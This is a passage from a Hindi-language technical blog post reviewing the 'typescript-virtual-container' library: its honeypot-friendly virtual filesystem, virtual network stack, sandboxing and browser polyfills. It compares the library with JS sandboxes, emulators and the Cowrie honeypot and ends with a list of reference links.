यह गुणात्मक Cowrie से अलग है। Cowrie नकली filesystem `ls` जवाब दे सकता है लेकिन हमलावर बनाई फाइलों और उसके लाए बदलावों को संरचित diff के रूप में सच में track नहीं कर सकता। `typescript-virtual-container` कर सकता है, क्योंकि VFS जीवित डेटा संरचना है, हर लेखन track किया जाता है। हमलावर अभी जोड़ी यह cron प्रविष्टि ? वह diff में है। यह `.hidden` फोल्डर ? diff में। malware विश्लेषण के लिए काफी उपयोगी।

### आभासी नेटवर्क stack

यह शायद पूरे प्रोजेक्ट का सबसे प्रभावशाली हिस्सा है, और इस स्थान के किसी अन्य प्रोजेक्ट में इसका समतुल्य नहीं है। जैसे, VPN समर्थन वाली पूर्ण L2/L3 आभासी नेटवर्क stack, शुद्ध TypeScript में लिखी, बिना किसी असली नेटवर्क कार्ड शामिल। यह सच में पागल है।

`VirtualNetworkManager` हर `VirtualShell` उदाहरण को कॉन्फ़िगर करने योग्य IP पतों, routing तालिकाओं, और software firewall (conntrack और NAT वाले iptables शैली नियम) वाली आभासी नेटवर्क इंटरफेस देता है। `ip addr`, `ip route`, `iptables -L`, `netstat -rn` सभी आभासी नेटवर्क स्थिति दिखाते हैं।

`VirtualSwitch` (Baie नाम, serveur bay फ्रांसीसी शब्द "baie informatique" से) कई shell साझा उपनेट पर जोड़ता है। वह लागू करता है :
- MAC सीखना और ARP
- उपनेटों के बीच IP routing
- NAT (बाहर जाने वाला masquerade)
- DNS (प्रति उपनेट कॉन्फ़िगर करने योग्य record)
- भार संतुलन (round-robin, कम कनेक्शन)
- ट्रैफिक shaping : विलंबता, jitter (gaussian वितरण), पैकेट हानि, salve हानि, पुनः क्रम, दोहराव
- bandwidth सीमा (token bucket)
- MTU अनुप्रयोग
- कनेक्शन tracking (स्थिति के साथ, NEW/ESTABLISHED/TIME_WAIT स्थितियाँ)

```ts
const baie = new Baie("192.168.0.0/24");

// उसी switch पर तीन आभासी मशीनें
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Firewall : web api पहुँच सकता है, api db पहुँच सकता है, web सीधे db नहीं पहुँच सकता
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// ट्रैफिक shaping : बाहर की ओर अस्थिर WAN लिंक अनुकरण करना
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` Baie उदाहरणों के बीच एन्क्रिप्टेड tunnel बनाता है, तुम sites के बीच VPN interconnection वाली बहु साइट नेटवर्क अनुकरण कर सकते हो।

`VirtualProxy` port forwarding और SOCKS5 proxy लागू करता है।

इसमें से कुछ भी असली नेटवर्क कार्ड नहीं छूता। यह सब TypeScript ऑब्जेक्ट routing है। `ping` कमांड आभासी switch से route करके और अनुकरण ICMP उत्तर लौटाकर "काम" करती है। `curl http://192.168.0.3/api` आभासी नेटवर्क से route करता है, api shell के अनुकरण HTTP उत्तर पहुँचता है, और सामग्री लौटाता है। यह नीचे तक कछुए हैं, सर्वोत्तम अर्थ में।

### `SandboxedShell`

प्रोग्राम करने योग्य उपयोग के लिए जहाँ तुम्हें मजबूत अलगाव चाहिए, `SandboxedShell` Node.js Worker thread में shell सत्र निष्पादित करता है :

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // एक core का 25%
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

यहाँ अलगाव VFS परत (worker thread shell सिर्फ आभासी filesystem देख सकता है, कभी host filesystem नहीं) साथ में Node.js Worker thread स्मृति अलगाव से सुनिश्चित है। यह `isolated-vm` से हल्का है लेकिन JS स्तर के बजाय shell स्तर अलगाव के लिए ज्यादा उपयुक्त है।

### संसाधन capping

तुम प्रति shell संसाधन सीमाएँ कॉन्फ़िगर कर सकते हो जो तंत्र निगरानी कमांड रिपोर्ट को प्रभावित करती हैं :

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

इस shell अंदर, `free -m` 512 Mo कुल RAM दिखाता है। `nproc` 2 लौटाता है। `/proc/meminfo` capped मान दिखाता है। `htop` और `top` capped CPU संख्या दिखाते हैं। यह तुम्हें अनुकरण मशीन की hardware छाप सटीक परिभाषित करने देता है।

### तीन परिनियोजन मोड

```
मोड 1 : SSH/SFTP serveur
  VirtualSshServer / VirtualSftpServer
  → असली SSH प्रोटोकॉल, असली SFTP, असली SCP
  → उपयोग मामला : honeypot, दूरस्थ परीक्षण वातावरण, प्रशिक्षण प्रयोगशाला

मोड 2 : Web shell (ब्राउज़र)
  builds/fortune-nyx-v1.7.8-web.min.js (ESM bundle)
  → ब्राउज़र में चलता है, IndexedDB में स्थायी VFS
  → उपयोग मामला : इंटरैक्टिव ट्यूटोरियल, embedded terminal, डेमो
  → बोनस : पूर्ण अनुकरण XFCE desktop के लिए startxfce4 निष्पादित करता है

मोड 3 : स्वायत्त CLI
  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs (एक ही फाइल, कोई स्थापना नहीं)
  → curl और निष्पादित करो, VFS .vfs/ निर्देशिका में स्थायी
  → उपयोग मामला : तेज डेमो, स्थानीय प्रयोग
```

### polyfill , ब्राउज़र build बिना Wasm कैसे काम करता है

ठीक यह वह हिस्सा है जिसे मैं सच में बुद्धिमान पाता हूँ और जिसे मैं विशेष रूप से रेखांकित करना चाहता था।

ब्राउज़र में Node.js लाइब्रेरी चलाना आमतौर पर दुःस्वप्न है। या तुम Wasm runtime इस्तेमाल करते हो (भारी, लोड धीमा), या तुम हर `node:*` आयात को ब्राउज़र संगत विकल्प से बदलने में हफ्ते बिताते हो। Fortune ने दूसरी चीज की, लेकिन बहुत साफ, भंडार के `polyfills/` निर्देशिका में रहने वाले कस्टम polyfill समुच्चय लिखकर।

build pipeline बस esbuild है जिसमें `alias` प्रविष्टियों का ढेर है :

```js
// demo/build.js , ब्राउज़र build की सारी config
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

बिना Wasm, बिना बाहरी polyfill लाइब्रेरी, बिना `webpack-node-externals` सहारे। बस उपनाम मॉड्यूल और कुछ डाले global। मुझे हर एक विस्तार देने दो क्योंकि कुछ सच में प्रभावशाली हैं।

**`node:fs` , नकली filesystem के रूप में IndexedDB**

यह मेरा पसंदीदा है। `node:fs` polyfill Node.js fs तुल्यकालिक API (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) लागू करता है जो दो परतों पर टिका है : तुल्यकालिक पढ़ने के लिए स्मृति में `Map`, और पेज reload के बीच स्थायित्व के लिए IndexedDB। लिखना Map में तुरंत जाता है (इसलिए `writeFileSync` ठीक बाद `readFileSync` हमेशा काम करता है), फिर पृष्ठभूमि में अतुल्यकालिक IndexedDB की ओर खाली होता है।

```js
// तुल्यकालिक Cache (पथ → Uint8Array | null) , तुरंत पढ़ना
const memCache = new Map();

// शुरू में IndexedDB से सब memCache में preload करना
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

यही कारण है कि VFS snapshot ब्राउज़र में पेज reload बचता है, पूरा `.vfsb` binary इस polyfill से IndexedDB में लिखा जाता है, और अगले लोड पर फिर से पढ़ा जाता है। बिना Wasm, बिना serveur। बस IndexedDB, जो 2011 से सभी ब्राउजरों में है।

**`node:crypto` , शुद्ध JS में SHA-256**

Wasm crypto लाइब्रेरी आयात करने के बजाय, crypto polyfill FIPS 180-4 round स्थिरांक इस्तेमाल करके scratch से SHA-256 लागू करता है। पूर्ण hex/base64/Uint8Array output समर्थन वाली शुद्ध JS की 166 पंक्तियाँ। लाइब्रेरी में सारा hashing इससे गुजरता है, SSH host कुंजी छाप, आंतरिक checksum, सब। संक्षिप्त, शून्य निर्भरता, काम करता है।

**`node:os` , ब्राउज़र का असली hardware पढ़ता है**

यह अच्छी attention है। hardcoded नकली मान लौटाने के बजाय, `node:os` कुल RAM के लिए `navigator.deviceMemory` और CPU संख्या के लिए `navigator.hardwareConcurrency` पढ़ता है। इसलिए ब्राउज़र build में `neofetch` असल में कुछ रिपोर्ट करता है जो तुम्हारी असली मशीन से मेल खाता है, नकली `2 core, 2 Go RAM` stub नहीं।

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // डिफ़ॉल्ट 2 Go
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // CPU मॉडल स्ट्रिंग अनुमान लगाने के लिए navigator.userAgent भी parse करता है
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify` , ईमानदार stub**

ब्राउज़र TCP socket नहीं खोल सकता या असली SSH निष्पादित नहीं कर सकता, इसलिए ये stub हैं जो स्पष्ट संदेश वाली `NotImplemented` त्रुटि फेंकते हैं अगर कुछ उन्हें इस्तेमाल करने की कोशिश करता है। विफलताएँ स्पष्ट रहती हैं, बिना `undefined` लौटाए जहाँ ऑब्जेक्ट अपेक्षित है। बस जोरदार और स्पष्ट संदेश "यह ब्राउज़र में काम नहीं करता", जो ठीक है जो तुम चाहते हो।

**`process.js` और `buffer.js` , डाले global**

ये दोनों esbuild `inject` विकल्प से bundle की हर फाइल के सिर में डाले जाते हैं, इसलिए `process` और `Buffer` बिना किसी स्पष्ट आयात वैश्विक उपलब्ध हैं। `process.js` छोटा है : `env`, `version`, `platform: 'browser'`, `queueMicrotask` से `nextTick`, `performance.now()` से `uptime`। `buffer.js` `Uint8Array` पर `Buffer` का पूर्ण पुनर्कार्यान्वयन है, सभी `readUInt32BE`, `writeInt16LE`, hex/base64 एन्कोडिंग जिन पर SSH कार्यान्वयन और VFS निर्भर हैं।

---

हाथ से लिखे JS की कुल लगभग 640 पंक्तियों का polyfill समुच्चय। बिना npm पैकेज, बिना Wasm। और परिणाम ब्राउज़र bundle है जो बस लाइब्रेरी है, स्वाभाविक चलता है, बिना "लेकिन क्या यह ब्राउज़र में सच में काम करता है ?" वाली सामान्य चिंता के जो तुम्हें पहले Node के लिए डिजाइन लाइब्रेरी के साथ होती है। अगर तुम उत्सुक हो तो भंडार में `polyfills/` फोल्डर पर नजर डालना उचित है, हर फाइल अच्छी तरह समाहित और खुद पठनीय है, जो शैली चुनाव है जिसकी मैं बहुत सराहना करता हूँ।

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **श्रेणी** | JS Sandbox | JS Sandbox | JS Sandbox | Emulator | Emulator | Node.js/Wasm | Honeypot | Simulator |
| **JS अलग करता है** | ⚠️ दायरा | ✅ V8 Isolate | ✅ Wasm | लागू नहीं | लागू नहीं | आंशिक | लागू नहीं | ✅ Worker |
| **असली Linux कर्नल** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **shell दुभाषिया** | ❌ | ❌ | ❌ | ✅ (असली) | ✅ (असली) | ✅ (असली) | आंशिक | ✅ (कस्टम) |
| **~170 Unix कमांड** | ❌ | ❌ | ❌ | ✅ | ✅ | आंशिक | ~20 | ✅ |
| **POSIX अनुमतियाँ** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | आंशिक | ✅ लागू |
| **उपयोगकर्ता प्रबंधन** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | न्यूनतम | ✅ पूर्ण |
| **असली SSH serveur** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/audit** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **VFS Diff/snapshot** | ❌ | ❌ | ❌ | सीमित | ❌ | ❌ | ❌ | ✅ |
| **L2/L3 आभासी नेटवर्क** | ❌ | ❌ | ❌ | बुनियादी | ❌ | ❌ | ❌ | ✅ पूर्ण |
| **आभासी VPN** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **ब्राउज़र समर्थन** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **नेटिव Node.js** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **typed API** | बुनियादी | ✅ | ✅ | न्यूनतम | ❌ | ✅ | ❌ | ✅ पूर्ण |
| **binary संगतता** | लागू नहीं | लागू नहीं | लागू नहीं | ✅ | ✅ | आंशिक | लागू नहीं | ❌ |
| **boot समय** | तुरंत | तुरंत | तुरंत | 15-40s | 15-40s | 2-5s | तुरंत | <1s |
| **RAM/उदाहरण** | ~1 Mo | ~3-10 Mo | ~5-15 Mo | 150-256 Mo | 200+ Mo | ~100 Mo | ~50 Mo | ~5-20 Mo |
| **runtime निर्भरताएँ** | 0 | 1 (नेटिव) | 1 (Wasm) | 0 | मालिकाना | 1 | Python निर्भरताएँ | 3 (ssh2, ws, fflate) |
| **स्थिति** | स्थिर | ✅ सक्रिय | ✅ सक्रिय | ✅ बहुत सक्रिय | वाणिज्यिक | ✅ सक्रिय | ✅ सक्रिय | ✅ सक्रिय |

---

## कब क्या इस्तेमाल करना है

**तुम्हें अविश्वसनीय JavaScript निष्पादित करना है, उपयोगकर्ता प्रस्तुत सूत्र, plugin, script hook।**
→ `isolated-vm`। असली V8 Isolate, कड़ी स्मृति सीमाएँ, स्पष्ट संचार सेतु। `vm2` से बचो, CVE सूची बस बढ़ती जाती है, गंभीरता से यह हर कुछ महीनों में नई जैसा है। `vm` से बचो, यह बिल्कुल sandbox नहीं है, कृपया।

**तुम्हें JS अलग करना है और तुम्हें नेटिव एक्सटेंशन नहीं चाहिए, या तुम्हें ब्राउज़र संगतता चाहिए।**
→ `quickjs-emscripten`। Wasm सीमा, लगभग 500 Ko मॉड्यूल, ब्राउजरों और Node में काम करता है। V8 से धीमा लेकिन सच में अलग।

**तुम्हें binary संगतता वाला असली अपरिवर्तित Linux OS boot करना है।**
→ 32-बिट Linux के लिए `v86`, या मौजूदा Docker छवि होने पर `container2wasm`। 150 Mo+ RAM और 30 सेकंड boot स्वीकार करो, यही deal है। अगर तुम्हें 64-बिट चाहिए, तो CheerpX देखो या बस असली कंटेनर runtime इस्तेमाल करो।

**तुम्हें बिना backend web application में Linux तरह का terminal एकीकृत करना है।**
→ `v86` (पूरा OS, भारी, boot धीमा) या `typescript-virtual-container` ब्राउज़र bundle (simulator, हल्का, तुरंत boot, पूर्ण desktop के लिए `startxfce4` शामिल जो इस बार काफी अच्छा है)।

**तुम्हें ऑनलाइन इंटरैक्टिव कोडिंग ट्यूटोरियल या ब्राउज़र IDE चाहिए।**
→ Node.js पारिस्थितिकी तंत्र पर केंद्रित होने पर WebContainers। असली Linux userspace चाहिए होने पर CheerpX। हल्का विकल्प typed API के साथ चाहिए होने पर `typescript-virtual-container` ब्राउज़र bundle।

**तुम्हें बड़े पैमाने SSH हमलावर TTP एकत्र करने हैं।**
→ Cowrie production मानक है, बस। किसी भी Linux serveur पर चलता है, सभी SIEM से एकीकृत होता है, अब LLM मोड रखता है। बस Cowrie इस्तेमाल करो।

**तुम्हें प्रोग्राम करने योग्य API वाली Node.js application में SSH honeypot डेटा चाहिए।**
→ `typescript-virtual-container`। कमांड सच में निष्पादित होती हैं। VFS असली डेटा संरचना है जिसे तुम तुरंत पकड़ और अंतर कर सकते हो। हमलावर को आश्वस्त इंटरैक्टिव वातावरण मिलता है, और तुम्हें Node छोड़े बिना संरचित audit डेटा मिलता है।

**तुम्हें बिना Docker CI में shell स्वचालन / परीक्षण चाहिए।**
→ `typescript-virtual-container`। एक सेकंड से कम में शुरू होता है, परीक्षण से पहले snapshot, बाद में पुनर्स्थापना। typed API से shell कमांड निष्पादित करो। बिना Docker daemon, बिना कर्नल, बिना VM, बिना प्रतीक्षा।

**तुम्हें बहु किरायेदार shell वातावरण (SaaS, शिक्षा, प्रशिक्षण) चाहिए।**
→ `typescript-virtual-container`। प्रति उदाहरण 5-20 Mo बनाम emulator के लिए 150-256 Mo। 100 एक साथ उपयोगकर्ता : ~2 Go बनाम ~25 Go। hosting लागत में बड़ा अंतर है !

**तुम्हें यथार्थवादी honeypot चाहिए जो तुम्हें बहु VM नेटवर्क प्रयोगशाला भी बनाने दे।**
→ `typescript-virtual-container` इस स्थान में अकेली चीज है जो दोनों करती है।

---

## यह क्या नहीं कर सकता (और मैं इस पर ईमानदार होना चाहता हूँ)

वह नेटिव x86 binary निष्पादित नहीं कर सकता। अगर तुम्हें C कोड संकलित करना है, असली Python दुभाषिया निष्पादित करना है, या Linux के लिए संकलित software इस्तेमाल करना है, तो इन तंत्र कॉल समर्थन के लिए कोई कर्नल ABI नहीं है। `gcc`, `python3`, और `node` जैसी कमांड stub हैं, वे `--version` और सामान्य आह्वानों को जवाब देती हैं, लेकिन कुछ असली निष्पादित नहीं करतीं।

यह मौलिक समझौता है : तुम 10 से 50 गुना कम स्मृति, तुरंत boot, ब्राउज़र संगतता, typed API, असली SSH, और आभासी नेटवर्क जीतते हो, और तुम Linux userspace से binary संगतता छोड़ते हो।

Fortune ने प्रोजेक्ट डिजाइन करते समय इस पर बहुत सोचा। जिन उपयोग मामलों को उसने लक्षित किया, honeypot, परीक्षण, embedded terminal, CI वातावरण, संकलित binary निष्पादित करना असल में कभी जरूरी नहीं है। shell pipeline, फाइल हेरफेर, नेटवर्क routing और SSH सब कवर करते हैं। लेकिन अगर तुम्हारे उपयोग मामले को असली संकलित software चाहिए, तो `v86` या Docker सही उत्तर है, यह नहीं।

---

## समाप्त करने के लिए

तो खैर। यह पारिस्थितिकी तंत्र बाहर से दिखता से बड़ा और ज्यादा खंडित है। `vm` दायरा विभाजक है, sandbox नहीं। `vm2` CVE जमा करना जारी रखता है (सच में, इस महीने के advisory देखो)। `isolated-vm` JS अलगाव के लिए सही उत्तर है लेकिन सिर्फ JS। `quickjs-emscripten` सही चुनाव है जब तुम्हें ब्राउज़र संगतता चाहिए या तुम नेटिव एक्सटेंशन से बचना चाहते हो। `v86` और CheerpX असली emulator हैं जब तुम्हें असली binary संगतता चाहिए। WebContainers Wasm में Node.js है, सामान्यवादी Linux वातावरण नहीं। Cowrie SSH honeypot का स्वर्ण मानक है, लेकिन यह Python है और नेटिव Node नहीं।

और फिर `typescript-virtual-container` है, Fortune का प्रोजेक्ट, जो अपनी श्रेणी में थोड़ा रहता है। न emulator, न JS sandbox, न निष्क्रिय honeypot। सभी बीच कुछ जो बहुत सी चीजों के लिए आश्चर्यजनक उपयोगी निकला जो अन्य कोई नहीं कर सकता।

`typescript-virtual-container` वह खाई भरता है जिसे अन्य कोई नहीं छूता : असली SSH, SFTP, POSIX अनुमतियों, उपयोगकर्ता प्रबंधन, आभासी नेटवर्क, और typed TypeScript API वाला पूर्ण और प्रोग्राम करने योग्य Linux shell वातावरण, लगभग 10 Mo में चलता है, एक सेकंड से कम में boot होता है, Node.js और ब्राउज़र दोनों में काम करता है।

अगर तुम इसे आजमाना चाहते हो : स्रोत कोड [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) पर है और ऑनलाइन डेमो (पूर्ण desktop के लिए `startxfce4` सहित, जो सच में बीमार है) [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo) पर है। उसे देखो और GitHub पर Fortune को कुछ star दो, वह योग्य है !

पढ़ने के लिए धन्यवाद, यह मेरे मानकों से भी लंबा था :) उम्मीद है यह तुम्हारे उपयोगी रहा !

---

## स्रोत

मैंने हर दावे को प्राथमिक स्रोत से जोड़ने की कोशिश की है, CVE advisory, आधिकारिक doc, GitHub भंडार, maintainer ब्लॉग लेख। कुछ नोट : vm2 CVE सूची बढ़ती जाती है इसलिए तुम पढ़ते समय FortiGuard लिंक पुराना हो सकता है (नवीनतम के लिए GitHub advisory पेज देखो)। Bellard लिंक सभी स्थिर हैं, उसकी व्यक्तिगत साइट हमेशा से वहाँ है और सामग्री नहीं बदलती। और अगर तुम किसी polyfill में गहरा जाना चाहते हो, तो सीधे `typescript-virtual-container` भंडार में `polyfills/` फोल्डर देखना काफी है, यह किसी भी विवरण से ज्यादा पठनीय है जो मैं यहाँ लिख सकता हूँ।

### JavaScript Sandbox

- **Node.js `vm` मॉड्यूल** , आधिकारिक दस्तावेज : [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Node.js `vm` सुरक्षा चेतावनी** , "vm मॉड्यूल सुरक्षा तंत्र नहीं है। अविश्वसनीय कोड निष्पादित करने के लिए इसका उपयोग मत करो" : [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`** , npm : [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub : [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **vm2 CVE कालक्रम** , पूर्ण CVE सूची और तिथियों वाला FortiGuard अलर्ट : [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** , async त्रुटि पलायन, GHSA : [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314** , Proxy + Error.name + Function escape, gist PoC : [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** , पूर्ण PoC वाली Exploit DB प्रविष्टि : [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **2026 के vm2 CVE** , 11 नए पलायन, विश्लेषण : [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer : [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"** , CVE-2022-36067 पर oxeye.io post-mortem : [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`** , npm : [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub : [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **V8 Isolate आंतरिक** , एकीकरण guide : [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`** , npm : [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub : [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`** , npm : [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub : [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **QuickJS इंजन** , Fabrice Bellard द्वारा : [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Deno अनुमति मॉडल** , docs : [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Deno 2 release** , अक्टूबर 2024 : [deno.com/blog/v2](https://deno.com/blog/v2)
- **TC39 ShadowRealm प्रस्ताव** , [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **TC39 Compartments प्रस्ताव** , [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"** , Deno sandbox दृष्टिकोण पर Andrew Healey का व्यावहारिक लेख : [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Linux Emulator

- **`v86`** , npm : [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub : [github.com/copy/v86](https://github.com/copy/v86) · डेमो : [copy.sh/v86](https://copy.sh/v86)
- **v86 OS समर्थन मैट्रिक्स** , [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (v86 इस्तेमाल BIOS) , [seabios.org](https://www.seabios.org/SeaBIOS)
- **Bochs VBE विस्तार** (VGA संदर्भ) , [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** , Bellard emulator : [bellard.org/jslinux](https://bellard.org/jslinux/) · तकनीकी नोट (TinyEMU, इतिहास, asm.js→Wasm) : [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** , C स्रोत : [bellard.org/tinyemu](https://bellard.org/tinyemu/) · अनाधिकारिक GitHub mirror : [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** , JS OpenRISC emulator : [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · डेमो : [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** , docs : [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthreads guide : [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers** , npm : [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API Docs : [webcontainers.io](https://webcontainers.io) · घोषणा : [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ अवलोकन : [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** , GitHub : [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTT ब्लॉग लेख : [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willison लेख : [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Terminal Stack

- **xterm.js** , npm : [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub : [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · साइट : [xtermjs.org](https://xtermjs.org)
- **node-pty** , npm : [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft) : [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypot

- **Cowrie** , GitHub : [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Docs : [docs.cowrie.org](https://docs.cowrie.org) · साइट : [cowrie.org](https://www.cowrie.org/)
- **Kippo** , GitHub (अभिलेखित) : [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** , GitHub : [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** , GitHub : [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** , Docker Hub : [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot** , न्यूनतम Node.js SSH Honeypot : [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** , व्यवस्थित सूची : [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** , तंत्र जानकारी खोज (हमलावर honeypot कैसे पहचानते हैं) : [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm** : [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub** : [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **ऑनलाइन डेमो** : [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **आर्किटेक्चर guide** : [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (SSH प्रोटोकॉल कार्यान्वयन) , npm : [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub : [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
